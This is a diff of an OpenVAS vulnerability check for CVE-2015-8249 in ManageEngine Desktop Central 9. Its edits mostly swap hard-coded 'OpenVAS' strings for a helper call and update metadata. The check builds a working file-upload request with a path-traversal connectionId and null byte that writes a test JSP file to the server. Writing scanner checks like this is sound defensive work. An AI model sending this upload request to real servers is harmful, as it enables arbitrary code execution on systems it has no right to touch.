@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_manageengine_desktopcentral_cve_2015_8249.nasl 11026 2018-08-17 08:52:26Z cfischer $
+# $Id: gb_manageengine_desktopcentral_cve_2015_8249.nasl 11523 2018-09-21 13:37:35Z asteins $
 #
 # ManageEngine Desktop Central 9 FileUploadServlet connectionId Vulnerability
 #
@@ -30,10 +30,10 @@ if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.140041");
   script_cve_id("CVE-2015-8249");
-  script_version("$Revision: 11026 $");
+  script_version("$Revision: 11523 $");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2018-08-17 10:52:26 +0200 (Fri, 17 Aug 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-21 15:37:35 +0200 (Fri, 21 Sep 2018) $");
   script_tag(name:"creation_date", value:"2016-11-01 16:26:16 +0100 (Tue, 01 Nov 2016)");
   script_name("ManageEngine Desktop Central 9 FileUploadServlet connectionId Vulnerability");
   script_category(ACT_ATTACK);
@@ -44,9 +44,7 @@ if(description)
   script_require_ports("Services/www", 8020);
 
   script_tag(name:"impact", value:"Successful exploitation will allow an attacker to gain arbitrary code
-  execution on the server.
-
-  Impact Level: System/Application");
+  execution on the server.");
 
   script_tag(name:"affected", value:"ManageEngine Desktop Central 9 < build 90142");
   script_tag(name:"solution", value:"Update to ManageEngine Desktop Central 9, build 90142 or newer.");
@@ -71,13 +69,14 @@ if( dir == "/" ) dir = "";
 
 host = http_host_name( port:port );
 
-str = 'OpenVAS_CVE-2015-8249_' + rand();
+vt_string = get_vt_string();
+str = vt_string + '_CVE-2015-8249_' + rand();
 
 postdata = '<%= new String("' + str  + '") %>';
 
-file = 'openvas_CVE-2015-8249_test.jsp';
+file = vt_string + '_CVE-2015-8249_test.jsp';
 
-url = dir + '/fileupload?connectionId=AAAAAAA%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cjspf%5c' + file  + '%00&resourceId=B&action=rds_file_upload&computerName=OpenVAS%2ephp&customerId=47474747';
+url = dir + '/fileupload?connectionId=AAAAAAA%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cjspf%5c' + file  + '%00&resourceId=B&action=rds_file_upload&computerName=' + vt_string + '%2ephp&customerId=47474747';
 
 req = http_post_req( port:port,
                      url:url,
